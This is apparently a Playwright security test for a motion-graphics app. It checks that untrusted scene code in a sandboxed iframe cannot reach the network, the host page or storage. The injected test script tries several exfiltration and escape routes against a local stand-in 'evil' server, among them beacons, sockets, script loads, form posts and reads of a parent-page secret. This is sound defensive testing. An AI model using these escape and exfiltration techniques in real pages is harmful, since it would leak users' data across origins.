import { test, after } from "node:test";
import assert from "node:assert/strict";
import { createServer } from "node:http";
import { mkdtemp, rm } from "node:fs/promises";
import path from "node:path";
import { tmpdir } from "node:os";
import { chromium } from "playwright-core";
import { blankTimeline } from "../src/lib/editor";
import { timelineSchema } from "../src/lib/schema";
import { motionDocument } from "../src/motion/document";

const root = await mkdtemp(path.join(tmpdir(), "reelchemy-motion-sandbox-"));
process.env.REELCHEMY_DATA_DIR = path.join(root, "data");
const { serveRenderAssets } = await import("../src/lib/render-assets");
after(() => rm(root, { recursive: true, force: true }));

test(
  "scene code cannot reach the network, the host page or storage, and still animates",
  { timeout: 120000 },
  async () => {
    // Any request reaching this server is a sandbox escape.
    const hits: string[] = [];
    const attacker = createServer((req, res) => {
      hits.push(`${req.method} ${req.url}`);
      res.writeHead(200, {
        "Access-Control-Allow-Origin": "*",
        "Content-Type": "text/javascript",
      });
      res.end("window.__escaped = true;");
    });
    await new Promise<void>((resolve) =>
      attacker.listen(0, "127.0.0.1", resolve),
    );
    const evil = `http://127.0.0.1:${(attacker.address() as { port: number }).port}`;
    const t = blankTimeline({
      prompt: "Sandbox",
      duration: 5,
      format: "landscape",
    });
    t.scenes[0].code = { html: "", css: "", js: "1;" };
    const served = await serveRenderAssets(timelineSchema.parse(t));
    // The page that hosts the scene: a stand-in for the studio or renderer,
    // with something worth stealing.
    const host = createServer((_req, res) => {
      res.writeHead(200, { "Content-Type": "text/html" });
      res.end(
        `<!doctype html><body><p id="secret">host-secret</p><iframe id="scene" sandbox="allow-scripts" style="width:640px;height:360px;border:0"></iframe></body>`,
      );
    });
    await new Promise<void>((resolve) => host.listen(0, "127.0.0.1", resolve));
    const browser = await chromium.launch({
      executablePath: process.env.CHROMIUM_PATH || "/usr/bin/chromium",
    });
    try {
      const page = await browser.newPage();
      await page.goto(
        `http://127.0.0.1:${(host.address() as { port: number }).port}/`,
      );
      const sceneDocument = motionDocument({
        code: {
          html: '<div id="report"></div><div id="box" style="width:100px;height:100px;background:#fff"></div>',
          css: "",
          js:
            `
const report = {};
const attempt = async (name, run) => {
  try { await run(); report[name] = "allowed"; } catch (e) { report[name] = "blocked"; }
};
await attempt("fetch", () => fetch("${evil}/fetch"));
await attempt("parent", () => parent.document.getElementById("secret").textContent);
await attempt("top", () => top.document.body.innerHTML);
await attempt("cookie", () => { if (document.cookie === undefined) throw 0; document.cookie = "x=1"; });
await attempt("localStorage", () => localStorage.setItem("x", "1"));
await attempt("indexedDB", () => new Promise((ok, fail) => { const r = indexedDB.open("x"); r.onsuccess = ok; r.onerror = fail; }));
try { navigator.sendBeacon("${evil}/beacon", "x"); } catch {}
try { new WebSocket("${evil.replace("http", "ws")}/ws"); } catch {}
try { const x = new XMLHttpRequest(); x.open("GET", "${evil}/xhr"); x.send(); } catch {}
const img = new Image(); img.src = "${evil}/image";
const s = document.createElement("script"); s.src = "${evil}/script.js"; document.head.appendChild(s);
const css = document.createElement("link"); css.rel = "stylesheet"; css.href = "${evil}/style.css"; document.head.appendChild(css);
try { const f = document.createElement("form"); f.action = "${evil}/form"; f.method = "post"; document.body.appendChild(f); f.submit(); } catch {}
try { window.open("${evil}/popup"); } catch {}
try { top.location = "${evil}/navigate"; } catch {}
document.getElementById("report").textContent = JSON.stringify(report);
gsap.to("#box", { x: 400, duration: 1, ease: "none" });`.replace(
              /^/,
              "(async () => {",
            ) + "})();",
        },
        baseUrl: served.motionBaseUrl,
        format: "landscape",
        width: 640,
        height: 360,
        fps: 30,
        durationSeconds: 2,
        seed: 1,
      });
      await page.evaluate((doc) => {
        (window as unknown as { loaded: Promise<void> }).loaded = new Promise(
          (resolve) =>
            addEventListener("message", (event) => {
              if ((event.data as { reelchemy?: string }).reelchemy === "loaded")
                resolve();
            }),
        );
        (document.getElementById("scene") as HTMLIFrameElement).srcdoc = doc;
      }, sceneDocument);
      await page.evaluate(
        () => (window as unknown as { loaded: Promise<void> }).loaded,
      );
      const frame = page.frames().find((f) => f !== page.mainFrame())!;
      await frame.waitForFunction(
        () => document.getElementById("report")?.textContent,
      );
      // Let any delayed request (beacons, sockets, images) try to leave.
      await page.waitForTimeout(1500);
      const report = JSON.parse(
        await frame.evaluate(
          () => document.getElementById("report")!.textContent!,
        ),
      );
      assert.deepEqual(report, {
        fetch: "blocked",
        parent: "blocked",
        top: "blocked",
        cookie: "blocked",
        localStorage: "blocked",
        indexedDB: "blocked",
      });
      assert.equal(
        await frame.evaluate(
          () => (window as unknown as { __escaped?: boolean }).__escaped,
        ),
        undefined,
      );
      assert.deepEqual(hits, [], "no request reached another origin");
      assert.equal(new URL(page.url()).hostname, "127.0.0.1");
      assert.equal(
        await page.textContent("#secret"),
        "host-secret",
        "host page untouched",
      );
      // The scene itself still runs on its virtual clock.
      const ready = await page.evaluate(
        () =>
          new Promise<unknown>((resolve) => {
            addEventListener("message", (event) => {
              if ((event.data as { reelchemy?: string }).reelchemy === "ready")
                resolve(event.data);
            });
            (
              document.getElementById("scene") as HTMLIFrameElement
            ).contentWindow!.postMessage(
              { reelchemy: "seek", id: 1, time: 0.5 },
              "*",
            );
          }),
      );
      assert(Math.abs((ready as { time: number }).time - 0.5) < 1e-9);
      const x = await frame.evaluate(() =>
        Number(
          (
            window as unknown as {
              gsap: { getProperty(target: string, name: string): unknown };
            }
          ).gsap.getProperty("#box", "x"),
        ),
      );
      assert.equal(Math.round(x), 200);
    } finally {
      await browser.close();
      await served.close();
      host.close();
      attacker.close();
    }
  },
);
